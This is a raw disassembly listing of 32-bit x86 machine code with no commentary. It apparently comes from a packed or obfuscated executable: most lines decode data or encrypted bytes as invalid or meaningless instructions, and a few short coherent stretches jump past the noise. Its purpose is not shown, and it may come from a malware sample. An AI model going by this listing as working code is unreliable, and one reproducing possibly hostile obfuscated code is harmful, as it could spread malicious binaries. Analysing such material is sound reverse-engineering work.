  403c0a:	lea    esp,[edx]
  403c0c:	xchg   BYTE PTR ds:0xd1fc8f39,dh
  403c12:	push   cs
  403c13:	push   edi
  403c14:	xchg   ebx,eax
  403c15:	mov    ebp,0xad64eea6
  403c1a:	mov    eax,0x115c9c1a
  403c1f:	xor    bl,BYTE PTR ds:0xa4b227a7
  403c25:	daa    
  403c26:	(bad)  
  403c27:	cmc    
  403c28:	xchg   esi,eax
  403c29:	(bad)  
  403c2a:	out    dx,al
  403c2b:	dec    DWORD PTR [edi+0x547bbbd1]
  403c31:	mov    ah,bl
  403c33:	bswap  eax
  403c35:	fcomp  QWORD PTR [ebx]
  403c37:	imul   esp,DWORD PTR [ecx],0xfffffff4
  403c3a:	mov    ecx,0x13ec42c4
  403c3f:	shl    DWORD PTR ds:0xc9504f26,0xdf
  403c46:	jno    0x403c78
  403c48:	(bad)  
  403c49:	and    BYTE PTR cs:[edi+0x3c4eb1c3],dl
  403c50:	lods   eax,DWORD PTR ds:[esi]
  403c51:	pop    esi
  403c52:	out    dx,al
  403c53:	mov    bl,0x5
  403c55:	add    cl,cl
  403c57:	stc    
  403c58:	or     al,0xb8
  403c5a:	jecxz  0x403c75
  403c5c:	test   DWORD PTR [ebp+0x10faa846],edx
  403c62:	mov    WORD PTR [ecx+0x48],ss
  403c65:	mov    dh,0x32
  403c67:	add    DWORD PTR [esi+0x4891a98e],ebp
  403c6d:	repnz add eax,0xef6279db
  403c73:	sub    al,0x6b
  403c75:	arpl   WORD PTR [ebp-0x50a174a0],sp
  403c7b:	jle    0x403c6e
  403c7d:	jnp    0x403c04
  403c7f:	or     eax,0x266652e0
  403c85:	ins    BYTE PTR es:[edi],dx
  403c86:	or     al,0xb2
  403c88:	mov    edx,0xc1d21af4
  403c8d:	out    0x12,eax
  403c8f:	scas   eax,DWORD PTR es:[edi]
  403c90:	push   eax
  403c91:	jecxz  0x403d0e
  403c93:	pop    edx
  403c94:	pop    eax
  403c95:	int    0x27
  403c97:	xor    al,0xcc
  403c99:	nop
  403c9a:	mov    ebp,0x99fcf795
  403c9f:	sub    esp,DWORD PTR [ecx-0x30da43bd]
  403ca5:	mov    eax,ds:0xbf0d5c69
  403caa:	addr16 iret 
  403cac:	(bad)  
  403cad:	sar    dh,0xe8
  403cb0:	xor    BYTE PTR [esi+0x15632572],bl
  403cb6:	frstor [ecx+esi*2-0x20]
  403cba:	or     al,0x6c
  403cbc:	nop
  403cbd:	jno    0x403c94
  403cbf:	pop    edi
  403cc0:	into   
  403cc1:	xor    esi,edi
  403cc3:	out    0x7d,eax
  403cc5:	pop    ebp
  403cc6:	fst    st(2)
  403cc8:	std    
  403cc9:	test   edi,eax
  403ccb:	jne    0x403c79
  403ccd:	pop    edx
  403cce:	or     al,BYTE PTR [eax-0x7b634840]
  403cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cd5:	inc    ecx
  403cd6:	mov    dh,0xcb
  403cd8:	popa   
  403cd9:	out    0x58,al
  403cdb:	les    ecx,FWORD PTR [edx]
  403cdd:	aaa    
  403cde:	icebp  
  403cdf:	shl    BYTE PTR [ecx-0x29],cl
  403ce2:	mov    ah,0x8c
  403ce4:	jge    0x403c86
  403ce6:	add    ah,0x2e
  403ce9:	jle    0x403ccc
  403ceb:	fldcw  WORD PTR [edi]
  403ced:	sbb    ch,al
  403cef:	sbb    bl,ch
  403cf1:	jmp    0x403ce6
  403cf3:	mov    al,ds:0x6c73d178
  403cf8:	cmp    esp,DWORD PTR [edi-0x4becf3af]
  403cfe:	mov    al,ds:0x4af8d91e
  403d03:	sub    ch,BYTE PTR [ebx+edx*4+0x2308147e]
  403d0a:	sub    al,0xe9
  403d0c:	cmp    ch,BYTE PTR [esp+ebp*1+0x75e84fe0]
  403d13:	std    
  403d14:	(bad)  
  403d15:	out    0x43,al
  403d17:	mov    ebp,0xbedfa6c8
  403d1c:	out    dx,eax
  403d1d:	jae    0x403d05
  403d1f:	mov    ebx,0x4585f002
  403d24:	add    eax,0xffffff8c
  403d27:	(bad)  
  403d28:	sub    eax,DWORD PTR [ecx-0x63]
  403d2b:	mov    ah,0xfe
  403d2d:	dec    esp
  403d2e:	cmp    DWORD PTR [edi],esp
  403d30:	jg     0x403cbb
  403d32:	jecxz  0x403d0b
  403d34:	mov    ds:0x674357a7,al
  403d39:	push   ss
  403d3a:	(bad)  
  403d3b:	pop    eax
  403d3c:	out    dx,eax
  403d3d:	cmp    bl,BYTE PTR [ebp+0x6]
  403d40:	daa    
  403d41:	mov    bh,BYTE PTR [ebp+edx*1+0xabc16ae]
  403d48:	adc    BYTE PTR [edi],dh
  403d4a:	pushf  
  403d4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d4c:	xchg   ebp,eax
  403d4d:	ins    DWORD PTR es:[edi],dx
  403d4e:	xchg   edi,eax
  403d4f:	inc    edi
  403d50:	das    
  403d51:	pop    ss
  403d52:	(bad)  
  403d53:	sbb    al,0x9e
  403d55:	sbb    ebx,DWORD PTR [ebx+0x31f5c434]
  403d5b:	nop
  403d5c:	in     eax,0xad
  403d5e:	fcomp  QWORD PTR ds:0x11ec6caf
  403d64:	out    dx,eax
  403d65:	push   edi
  403d66:	jge    0x403d66
  403d68:	outs   dx,BYTE PTR ds:[esi]
  403d69:	fs into 
  403d6b:	add    DWORD PTR [ecx-0x28953435],0x9dc9a8d4
  403d75:	push   edi
  403d76:	inc    ebp
  403d77:	test   DWORD PTR fs:[ebx+0x60673575],eax
  403d7e:	sti    
  403d7f:	push   esp
  403d80:	pusha  
  403d81:	or     bl,ch
  403d83:	int3   
  403d84:	xchg   edi,eax
  403d85:	js     0x403d64
  403d87:	mov    eax,0xa7d8109e
  403d8c:	lods   al,BYTE PTR ds:[esi]
  403d8d:	ins    DWORD PTR es:[edi],dx
  403d8e:	pop    ss
  403d8f:	rcl    DWORD PTR [ebx-0x72093abe],1
  403d95:	jae    0x403db7
  403d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d98:	sahf   
  403d99:	bound  edx,QWORD PTR [edi-0x6d]
  403d9c:	fwait
  403d9d:	adc    cl,bl
  403d9f:	inc    eax
  403da0:	in     eax,0x7a
  403da2:	add    esi,DWORD PTR [esi-0x4f1411e1]
  403da8:	mov    ecx,0x8cc031ec
  403dad:	pushf  
  403dae:	shl    ch,1
  403db0:	jo     0x403d85
  403db2:	bound  edx,QWORD PTR [ecx-0x1b]
  403db5:	scas   al,BYTE PTR es:[edi]
  403db6:	cli    
  403db7:	xchg   ecx,eax
  403db8:	mov    esp,0x9c9cdfd
  403dbd:	pop    esi
  403dbe:	fdivr  DWORD PTR [ebp-0x6]
  403dc1:	out    dx,al
  403dc2:	jbe    0x403da6
  403dc4:	sbb    BYTE PTR [edx+eax*4],0x69
  403dc8:	adc    ebp,DWORD PTR es:[ecx+ebp*4-0x60977edb]
  403dd0:	xchg   DWORD PTR [ecx],edx
  403dd2:	out    0x73,eax
  403dd4:	dec    ebx
  403dd5:	loopne 0x403d6d
  403dd7:	or     bl,0x48
  403dda:	stc    
  403ddb:	hlt    
  403ddc:	mov    ch,0x20
  403dde:	push   ds
  403ddf:	test   al,0x81
  403de1:	mov    cs,WORD PTR [ebx-0x4af928ff]
  403de7:	je     0x403e11
  403de9:	in     al,dx
  403dea:	loopne 0x403ddc
  403dec:	inc    ebp
  403ded:	xchg   ecx,eax
  403dee:	in     eax,0x64
  403df0:	pop    edx
  403df1:	hlt    
  403df2:	mov    eax,0x82a8bc0e
  403df7:	and    DWORD PTR [edx+0x43dd707e],0xffffff8d
  403dfe:	pop    esi
  403dff:	push   0xafbcd8c4
  403e04:	dec    esi
  403e05:	fdiv   QWORD PTR [ecx+eax*1]
  403e08:	push   0x37
  403e0a:	ror    DWORD PTR [eax+0x5363e951],cl
  403e10:	int    0x58
  403e12:	jge    0x403dd2
  403e14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e16:	pop    edi
  403e17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e18:	xchg   edx,eax
  403e19:	jae    0x403da2
  403e1b:	sub    DWORD PTR [edi],edi
  403e1d:	lods   eax,DWORD PTR ds:[esi]
  403e1e:	and    bl,ch
  403e20:	push   ecx
  403e21:	les    esi,FWORD PTR ds:0x121c6e35
  403e27:	mov    ah,0x99
  403e29:	imul   eax,edi,0x5ff40bc5
  403e2f:	push   ecx
  403e30:	das    
  403e31:	adc    al,ah
  403e33:	retf   
  403e34:	xor    DWORD PTR [esi],ebx
  403e36:	sbb    al,0x39
  403e38:	out    0x7a,al
  403e3a:	cwde   
  403e3b:	push   ecx
  403e3c:	sbb    dl,dh
  403e3e:	cmp    BYTE PTR [edx],ah
  403e40:	int    0x2f
  403e42:	lods   eax,DWORD PTR ds:[esi]
  403e43:	ffreep st(6)
  403e45:	push   esi
  403e46:	cmp    eax,0xa2c4fbf0
  403e4b:	and    dl,ah
  403e4d:	icebp  
  403e4e:	dec    ebx
  403e4f:	sub    dh,dl
  403e51:	add    esp,edi
  403e53:	ds push ecx
  403e55:	mov    esp,0x7cd80016
  403e5a:	ret    0x55c6
  403e5d:	repnz iret 
  403e5f:	push   0x4d
  403e61:	out    0x17,al
  403e63:	add    DWORD PTR [ebx],ebx
  403e65:	dec    ebp
  403e66:	out    dx,al
  403e67:	iret   
  403e68:	fsubr  DWORD PTR [ebp+0x65]
  403e6b:	loopne 0x403e45
  403e6d:	mov    dh,0x13
  403e6f:	adc    ebp,ecx
  403e71:	test   bh,cl
  403e73:	add    DWORD PTR [esi-0x2c],esp
  403e76:	push   cs
  403e77:	sbb    bh,BYTE PTR [edi+0x76]
  403e7a:	and    BYTE PTR [ecx],bl
  403e7c:	scas   al,BYTE PTR es:[edi]
  403e7d:	inc    esp
  403e7e:	in     eax,0x34
  403e80:	push   edi
  403e81:	pop    edi
  403e82:	cmovns esp,DWORD PTR ds:0xa9f440ec
  403e89:	jns    0x403e30
  403e8b:	sub    DWORD PTR [ebp+0x20],ebx
  403e8e:	push   0x13e59209
  403e93:	dec    esi
  403e94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e95:	add    BYTE PTR [ecx+0xb],ch
  403e98:	sbb    edx,DWORD PTR [ecx-0x28e49eb8]
  403e9e:	pop    es
  403e9f:	ja     0x403f16
  403ea1:	stc    
  403ea2:	jmp    0x5cf9b587
  403ea7:	call   DWORD PTR [ebx-0x48a15918]
  403ead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403eae:	push   cs
  403eaf:	arpl   dx,bp
  403eb1:	or     eax,0x29c2d9ff
  403eb6:	imul   ch
  403eb8:	or     al,0xfd
  403eba:	stos   BYTE PTR es:[edi],al
  403ebb:	test   esp,esp
  403ebd:	nop
  403ebe:	ror    BYTE PTR [ecx+0x411f8ee6],cl
  403ec4:	into   
  403ec5:	nop
  403ec6:	pop    ecx
  403ec7:	imul   edi,DWORD PTR [esi+0xab5584a],0x90f0ade0
  403ed1:	shl    BYTE PTR [ebx-0x21d6a1ca],0xe5
  403ed8:	mov    eax,0x72af1ac8
  403edd:	in     eax,0xb4
  403edf:	rol    DWORD PTR [ecx+0x6],0x2c
  403ee3:	dec    ebp
  403ee4:	in     al,0xdb
  403ee6:	in     eax,0x9f
  403ee8:	int3   
  403ee9:	push   ebx
  403eea:	jg     0x403f2e
  403eec:	shr    DWORD PTR [edi+ebp*1+0x7e999f3e],cl
  403ef3:	repnz test edi,0x93221453
  403efa:	add    al,0x30
  403efc:	push   ds
  403efd:	dec    eax
  403efe:	loop   0x403f3e
  403f00:	pop    ds
  403f01:	jp     0x403eac
  403f03:	retf   
  403f04:	pop    edi
  403f05:	repnz hlt 
  403f07:	(bad)  
  403f08:	into   
  403f09:	mov    BYTE PTR [ebp+0x3],dh
  403f0c:	add    DWORD PTR [ecx],ebx
  403f0e:	sbb    eax,0x42814f
  403f13:	mov    DWORD PTR [ebp-0x14],eax
  403f16:	mov    ecx,DWORD PTR [ebx]
  403f18:	mov    eax,DWORD PTR [ebx+0x4]
  403f1b:	mov    edx,DWORD PTR ds:0x4281cf
  403f21:	mov    edx,DWORD PTR [edx]
  403f23:	add    DWORD PTR ds:0x42835b,edx
  403f29:	shrd   ecx,eax,0x2
  403f2d:	sub    edx,0x9bd
  403f33:	shr    eax,0x2
  403f36:	and    eax,eax
  403f38:	mov    eax,DWORD PTR [ebx]
  403f3a:	and    DWORD PTR ds:0x428217,0x5c10
  403f44:	jmp    0x404322
  403f49:	sub    DWORD PTR [ecx-0x65e52424],0xffffff82
  403f50:	and    esi,esi
  403f52:	sbb    BYTE PTR [ecx-0x7a6b744],ch
  403f58:	push   0xffffffce
  403f5a:	xlat   BYTE PTR ds:[ebx]
  403f5b:	sbb    BYTE PTR [eax],bl
  403f5d:	sahf   
  403f5e:	adc    bl,BYTE PTR [eax]
  403f60:	sbb    dh,bh
  403f62:	fisttp WORD PTR [ebx+0xcc9ac28]
  403f68:	cmp    BYTE PTR [ebp-0x517d9860],cl
  403f6e:	and    esp,DWORD PTR [edx]
  403f70:	inc    esi
  403f71:	in     eax,0xb1
  403f73:	cmp    eax,DWORD PTR [eax+edx*8-0x10878479]
  403f7a:	lahf   
  403f7b:	mov    ecx,0x2dbfb271
  403f80:	xchg   esp,eax
  403f81:	call   0x4cf29855
  403f86:	jmp    0x3556:0x79e0cb08
  403f8d:	inc    esi
  403f8e:	(bad)  
  403f8f:	mov    dl,0x0
  403f91:	adc    cl,al
  403f93:	outs   dx,BYTE PTR ds:[esi]
  403f94:	sbb    bh,BYTE PTR [edx]
  403f96:	jp     0x403f91
  403f98:	cmp    al,0xe4
  403f9a:	call   0x6b2050f8
  403f9f:	pushw  cs
  403fa1:	loop   0x403fb0
  403fa3:	mov    esi,0x3c889138
  403fa8:	adc    BYTE PTR [esi],ah
  403faa:	jle    0x403fbf
  403fac:	cmp    BYTE PTR [eax-0x60],bl
  403faf:	mov    edx,0xae2ddb97
  403fb4:	cli    
  403fb5:	xor    DWORD PTR [edx],eax
  403fb7:	push   edi
  403fb8:	cwde   
  403fb9:	fisubr DWORD PTR [eax-0x47]
  403fbc:	mov    bh,0x98
  403fbe:	xchg   ebp,eax
  403fbf:	fcmovne st,st(1)
  403fc1:	(bad)  
  403fc2:	retf   
  403fc3:	outs   dx,BYTE PTR ds:[esi]
  403fc4:	fdiv   DWORD PTR [ecx-0x5630967f]
  403fca:	mov    edx,0xa6c69860
  403fcf:	jb     0x403f76
  403fd1:	add    edi,ebx
  403fd3:	jp     0x403fd7
  403fd5:	imul   esp,DWORD PTR [esi+eiz*4],0x3d
  403fd9:	xor    DWORD PTR [edx],esp
  403fdb:	mov    cl,BYTE PTR [ebp-0x1f]
  403fde:	inc    eax
  403fdf:	or     al,0xd7
  403fe1:	sbb    eax,0xb3bad856
  403fe6:	push   ebp
  403fe7:	mul    bh
  403fe9:	lock mov DWORD PTR ds:0x7ab5720,edx
  403ff0:	ins    BYTE PTR es:[edi],dx
  403ff1:	(bad)  
  403ff2:	fcmovb st,st(2)
  403ff4:	xor    al,0xf
  403ff6:	pop    ebp
  403ff7:	pop    ebx
  403ff8:	rol    BYTE PTR [edi-0x22a2af7c],cl
  403ffe:	sub    eax,0x6110b9ff
  404003:	cmc    
  404004:	into   
  404005:	push   esp
  404006:	xchg   BYTE PTR [edi+0x320d6760],cl
  40400c:	dec    edi
  40400d:	mov    edi,0x46058ba7
  404012:	(bad)  
  404013:	int3   
  404014:	retf   0x89fd
  404017:	not    al
  404019:	(bad)  
  40401a:	retf   0x7e9
  40401d:	cli    
  40401e:	sbb    ebx,DWORD PTR [ebx-0x1ccd5519]
  404024:	retf   0xaee6
  404027:	cmc    
  404028:	push   ds
  404029:	shr    DWORD PTR [ecx+0x5c],cl
  40402c:	sti    
  40402d:	scas   al,BYTE PTR es:[edi]
  40402e:	ret    
  40402f:	push   es
  404030:	fdiv   DWORD PTR [eax-0x203f9776]
  404036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404037:	sbb    ch,BYTE PTR [edx+0x3ff798db]
  40403d:	ins    DWORD PTR es:[edi],dx
  40403e:	add    al,0xdc
  404040:	outs   dx,BYTE PTR ds:[esi]
  404041:	jne    0x403fdd
  404043:	xchg   esp,eax
  404044:	iret   
  404045:	push   ds
  404046:	sbb    ebp,edi
  404048:	adc    dh,dh
  40404a:	push   ds
  40404b:	shl    BYTE PTR [esi-0x5c5f37ed],1
  404051:	bound  ecx,QWORD PTR [eax]
  404053:	in     eax,dx
  404054:	xchg   edx,eax
  404055:	sbb    edi,ebx
  404057:	dec    esp
  404058:	leave  
  404059:	cdq    
  40405a:	mov    ecx,0xfc35b816
  40405f:	sub    BYTE PTR ss:[eax+0x30],0x45
  404064:	mov    ebx,0xbba9fa52
  404069:	nop
  40406a:	xchg   esp,eax
  40406b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40406c:	dec    ecx
  40406d:	cld    
  40406e:	aas    
  40406f:	pushf  
  404070:	ins    BYTE PTR es:[edi],dx
  404071:	bound  ecx,QWORD PTR [eax]
  404073:	dec    ebp
  404074:	call   0xf27cba1d
  404079:	xchg   BYTE PTR [eax+0x7f],ch
  40407c:	dec    edx
  40407d:	stc    
  40407e:	lea    edx,[esi+0x65]
  404081:	xor    ecx,DWORD PTR [ecx+0x41d04e9f]
  404087:	mov    bl,0x44
  404089:	rcl    BYTE PTR [esi],0xcc
  40408c:	ins    DWORD PTR es:[edi],dx
  40408d:	in     eax,dx
  40408e:	xor    ebp,eax
  404090:	adc    BYTE PTR [ecx],al
  404092:	mov    BYTE PTR [esi],bl
  404094:	and    al,0xff
  404096:	sub    DWORD PTR [ecx+0x41],esi
  404099:	(bad)  
  40409a:	xor    eax,0x7f234708
  40409f:	repnz mov al,0x2a
  4040a2:	test   DWORD PTR [ecx+ebx*4-0x43],edx
  4040a6:	push   ebp
  4040a7:	loop   0x404078
  4040a9:	xchg   BYTE PTR [edi-0xd3b97da],al
  4040af:	lea    ebp,[eax+ebx*8-0xc4b0fbe]
  4040b6:	bound  ecx,QWORD PTR [edx-0x1f1bdeb3]
  4040bc:	lods   eax,DWORD PTR ds:[esi]
  4040bd:	mov    esp,0xb330ffd2
  4040c2:	cdq    
  4040c3:	cmp    BYTE PTR [edx-0x21],dl
  4040c6:	ds out dx,al
  4040c8:	and    BYTE PTR [esi+0x18],bl
  4040cb:	mov    eax,ds:0xa181afd
  4040d0:	mov    BYTE PTR [edx*8+0x102fc14f],ch
  4040d7:	dec    esp
  4040d8:	adc    bl,BYTE PTR [edx]
  4040da:	mov    ecx,0xa1e9bd7a
  4040df:	xchg   ecx,eax
  4040e0:	lock mov cl,0x17
  4040e3:	sahf   
  4040e4:	or     BYTE PTR [edi],cl
  4040e6:	inc    esp
  4040e7:	ror    BYTE PTR [esi],0x5c
  4040ea:	jmp    0x79e52a7d
  4040ef:	mov    dl,0x82
  4040f1:	or     al,0xab
  4040f3:	fmul   st(7),st
  4040f5:	xor    ch,BYTE PTR [ebx+0x6427e22]
  4040fb:	idiv   BYTE PTR [eax-0x3d]
  4040fe:	nop
  4040ff:	mov    ds:0xf0351bdf,al
  404104:	repnz clc 
  404106:	shr    DWORD PTR [ecx+0x745afb72],1
  40410c:	in     eax,dx
  40410d:	retf   
  40410e:	loope  0x404110
  404110:	inc    edi
  404111:	mov    BYTE PTR [edi+0x4868df40],0x5a
  404118:	fmul   QWORD PTR [ebp-0x4c]
  40411b:	or     al,0x2
  40411d:	mov    edx,0xc57fc909
  404122:	div    DWORD PTR [edi+0x15d7948]
  404128:	repnz lods al,BYTE PTR ds:[esi]
  40412a:	jmp    0x766b:0x337f3c88
  404131:	jl     0x4040eb
  404133:	jmp    0x4040c6
  404135:	fadd   st,st(7)
  404137:	xchg   DWORD PTR [edi+0x3437a3f9],esp
  40413d:	push   edi
  40413e:	xor    ah,ch
  404140:	dec    edx
  404141:	outs   dx,DWORD PTR ds:[esi]
  404142:	inc    esp
  404143:	bound  ecx,QWORD PTR [edi+ebp*8-0x5d]
  404147:	or     ah,BYTE PTR [ecx]
  404149:	fcomp  QWORD PTR [ecx-0x6ba767e5]
  40414f:	jo     0x404144
  404151:	mov    ebx,DWORD PTR [edi+0x24]
  404154:	scas   al,BYTE PTR es:[edi]
  404155:	lsl    ebp,bp
  404158:	jp     0x4041cd
  40415a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40415b:	ror    bh,1
  40415d:	cwde   
  40415e:	push   ecx
  40415f:	fdiv   st,st(7)
  404161:	jnp    0x404164
  404163:	pop    esp
  404164:	(bad)  
  404165:	mov    dh,0x44
  404167:	retf   
  404168:	mov    esi,DWORD PTR [edx+ebx*1+0x3]
  40416c:	pushf  
  40416d:	mov    ds:0x478df6d4,eax
  404172:	stos   DWORD PTR es:[edi],eax
  404173:	mov    cl,0x6c
  404175:	rcr    DWORD PTR [ecx+0x7d],1
  404178:	pop    esp
  404179:	dec    eax
  40417a:	add    bl,al
  40417c:	cmp    bl,dh
  40417e:	sbb    BYTE PTR ds:0x85a13d03,0xbf
  404185:	in     al,dx
  404186:	pop    ebx
  404187:	cs das 
  404189:	aam    0x8
  40418b:	or     BYTE PTR [eax-0x69],ah
  40418e:	aaa    
  40418f:	sti    
  404190:	lock in eax,dx
  404192:	(bad)  
  404193:	test   eax,0x15f55d18
  404198:	add    ecx,DWORD PTR [edx+0x5c461ae2]
  40419e:	jp     0x404139
  4041a0:	adc    eax,0xd0a74502
  4041a5:	mov    ebx,0xc269bc87
  4041aa:	popa   
  4041ab:	xor    ebx,DWORD PTR [ebx-0x57]
  4041ae:	or     BYTE PTR [edi+eiz*1+0x49],bh
  4041b2:	sub    DWORD PTR [edi-0x4d],edx
  4041b5:	xchg   ecx,eax
  4041b6:	popa   
  4041b7:	ins    BYTE PTR es:[edi],dx
  4041b8:	inc    ebp
  4041b9:	jmp    0x40421b
  4041bb:	jno    0x404190
  4041bd:	rol    BYTE PTR [ecx-0x45567591],0xd3
  4041c4:	pop    ds
  4041c5:	popw   ds
  4041c7:	mov    dh,0x16
  4041c9:	outs   dx,BYTE PTR ds:[esi]
  4041ca:	aad    0x42
  4041cc:	sahf   
  4041cd:	(bad)  
  4041cf:	jp     0x40421a
  4041d1:	sti    
  4041d2:	mov    edx,0x756cf983
  4041d7:	(bad)  
  4041d8:	push   ds
  4041d9:	lock test al,0x85
  4041dc:	inc    ebp
  4041dd:	inc    ebp
  4041de:	lods   eax,DWORD PTR ds:[esi]
  4041df:	jl     0x40425e
  4041e1:	jne    0x4041ff
  4041e3:	pop    esp
  4041e4:	cmp    al,0x27
  4041e6:	in     al,dx
  4041e7:	outs   dx,DWORD PTR ds:[esi]
  4041e8:	jbe    0x404230
  4041ea:	popf   
  4041eb:	jmp    0xda84:0x377d8f47
  4041f2:	frstor [edi+0x6288503a]
  4041f8:	inc    esi
  4041f9:	inc    DWORD PTR [ecx+0x66f5e869]
  4041ff:	add    eax,0x19011eae
  404204:	retf   
  404205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404206:	jb     0x40426d
  404208:	pop    edx
  404209:	outs   dx,BYTE PTR ds:[esi]
  40420a:	mov    ecx,0xc2d79399
  40420f:	ret    0xeeb3
  404212:	or     esp,ebx
  404214:	inc    edx
  404215:	adc    edi,eax
  404217:	sub    eax,0x2cd2e6c6
  40421c:	mov    ds:0x43581079,al
  404221:	pusha  
  404222:	retf   
  404223:	lahf   
  404224:	mov    edi,0xfbb1c84
  404229:	mov    BYTE PTR [esi+0x2a057e5d],0xc8
  404230:	jnp    0x404213
  404232:	pop    esp
  404233:	inc    esi
  404234:	ja     0x4041db
  404236:	fwait
  404237:	jne    0x4041ef
  404239:	sbb    BYTE PTR [di-0x7ee5],0xe1
  40423f:	push   edi
  404240:	lods   al,BYTE PTR ds:[esi]
  404241:	aad    0x7f
  404243:	mov    dh,0xb0
  404245:	or     eax,0x6b198036
  40424a:	adc    eax,0xae3c6b65
  40424f:	loop   0x404203
  404251:	stc    
  404252:	or     edx,esi
  404254:	ficom  WORD PTR [ebx-0x35]
  404257:	fisub  WORD PTR [edx]
  404259:	dec    eax
  40425a:	sub    esi,DWORD PTR [ecx]
  40425c:	in     al,dx
  40425d:	mov    DWORD PTR [ecx+edx*4],esi
  404260:	lds    ebx,FWORD PTR [eax]
  404262:	pop    eax
  404263:	fidiv  WORD PTR [edx]
  404265:	jb     0x40427b
  404267:	aad    0xe4
  404269:	mov    eax,ds:0x78d65cf8
  40426e:	std    
  40426f:	int    0x26
  404271:	aad    0xe
  404273:	mov    ch,0x1
  404275:	xor    al,BYTE PTR [ecx+0x67]
  404278:	in     al,0x2b
  40427a:	outs   dx,DWORD PTR ds:[esi]
  40427b:	mov    esp,0xdafb8b44
  404280:	mov    BYTE PTR [eax],0x56
  404283:	jnp    0x40428c
  404285:	and    al,BYTE PTR [ebx+eiz*2+0x10baa8c9]
  40428c:	iret   
  40428d:	loope  0x4042db
  40428f:	das    
  404290:	dec    eax
  404291:	adc    DWORD PTR [ebp-0x42],0x17
  404295:	pop    esp
  404296:	mov    al,0x2f
  404298:	adc    cl,0x72
  40429b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40429c:	jmp    0xe944:0x94c19b6f
  4042a3:	xor    DWORD PTR [edi+eiz*4+0x422b73ef],edi
  4042aa:	sub    edx,edx
  4042ac:	retf   
  4042ad:	pop    edx
  4042ae:	adc    DWORD PTR [edi+0x4f8e3d8a],ecx
  4042b4:	fadd   QWORD PTR [ecx-0x31]
  4042b7:	push   edi
  4042b8:	xor    DWORD PTR [ecx-0x1b],esi
  4042bb:	sub    ebp,DWORD PTR [edi+0x62e57c6c]
  4042c1:	sub    dh,ch
  4042c3:	pop    ecx
  4042c4:	sar    BYTE PTR [esi+0x68],1
  4042c7:	push   ebp
  4042c8:	mov    dh,0xb6
  4042ca:	daa    
  4042cb:	in     al,dx
  4042cc:	sub    eax,0xb45d548f
  4042d1:	out    0x4b,al
  4042d3:	sub    eax,0x618b7406
  4042d8:	in     al,dx
  4042d9:	add    DWORD PTR [eax+ecx*1-0x19],esi
  4042dd:	pop    ebx
  4042de:	ja     0x404293
  4042e0:	outs   dx,DWORD PTR ds:[esi]
  4042e1:	inc    ebx
  4042e2:	std    
  4042e3:	dec    eax
  4042e4:	jle    0x4042fe
  4042e6:	cmp    ch,BYTE PTR [edi-0xf]
  4042e9:	cld    
  4042ea:	or     BYTE PTR [edi+esi*8-0x7b1079ea],0xe6
  4042f2:	shr    BYTE PTR [esi+0x73],cl
  4042f5:	xor    DWORD PTR [ebp+ebp*4+0x1c],eax
  4042f9:	dec    ebx
  4042fa:	cmp    cl,al
  4042fc:	call   0x22ee:0xb77f4ebc
  404303:	jl     0x404361
  404305:	retf   
  404306:	jo     0x40431a
  404308:	aam    0x62
  40430a:	push   ecx
  40430b:	cmp    bl,BYTE PTR [edx]
  40430d:	push   0x51
  40430f:	push   ecx
  404310:	enter  0xe172,0x5
  404314:	(bad)  
  404315:	mov    esi,0x194e7285
  40431a:	jo     0x404321
  40431c:	arpl   WORD PTR [edx+ebx*8-0x74fde045],sp
  404323:	push   ebx
  404324:	add    al,0x21
  404326:	sbb    eax,0x42821b
  40432b:	xor    ecx,edi
  40432d:	or     edx,DWORD PTR ds:0x42824b
  404333:	shl    eax,0x1e
  404336:	and    edx,DWORD PTR ds:0x4282c7
  40433c:	xor    eax,eax
  40433e:	mov    edx,DWORD PTR ds:0x428207
  404344:	and    DWORD PTR ds:0x428367,edx
  40434a:	or     eax,ecx
  40434c:	mov    ecx,DWORD PTR [ebx]
  40434e:	movzx  edx,BYTE PTR ds:0x42834f
  404355:	sbb    DWORD PTR ds:0x42825b,edx
  40435b:	mov    edx,DWORD PTR [ebx+0x4]
  40435e:	jmp    0x40473c
  404363:	xchg   BYTE PTR [eax+ebp*4],ch
  404366:	xchg   edx,eax
  404367:	call   0x1412:0x951c227a
  40436e:	stos   BYTE PTR es:[edi],al
  40436f:	push   ds
  404370:	imul   di,WORD PTR [ebp+edx*2-0x61e7e731],0x1812
  40437a:	sbb    BYTE PTR [ecx+0x26],ch
  40437d:	dec    edi
  40437e:	(bad)  
  404380:	(bad)  
  404381:	popa   
  404382:	scas   eax,DWORD PTR es:[edi]
  404383:	ret    0xb0be
  404386:	add    al,BYTE PTR [edx+0x15]
  404389:	ret    0xbc69
  40438c:	fmul   QWORD PTR [esi-0x548a6854]
  404392:	mov    ecx,DWORD PTR [esi+0x616565e1]
  404398:	imul   ebx,DWORD PTR [ebx-0x39b18710],0xffffff99
  40439f:	lods   al,BYTE PTR ds:[esi]
  4043a0:	fcomp  st(0)
  4043a2:	jmp    0x55c1:0xc1eaa7e2
  4043a9:	cmp    cl,ch
  4043ab:	jl     0x40437e
  4043ad:	mov    esp,0xb6adc317
  4043b2:	jmp    0x404374
  4043b4:	push   ebp
  4043b5:	int3   
  4043b6:	pop    edi
  4043b7:	ss js  0x404423
  4043ba:	jle    0x4043c9
  4043bc:	aaa    
  4043bd:	fmulp  st(0),st
  4043bf:	push   edx
  4043c0:	sar    BYTE PTR [eax-0x2008f992],1
  4043c6:	add    eax,DWORD PTR ds:0xb7b54f0e
  4043cc:	aaa    
  4043cd:	mov    edi,0xb662a4f6
  4043d2:	sub    al,BYTE PTR [eax]
  4043d4:	aas    
  4043d5:	prefetchnta BYTE PTR [esi]
  4043d8:	test   DWORD PTR [ecx-0xc],ebp
  4043db:	mov    BYTE PTR [eax-0x4a2e3db8],0x94
  4043e2:	scas   eax,DWORD PTR es:[edi]
  4043e3:	cmp    eax,0xed949403
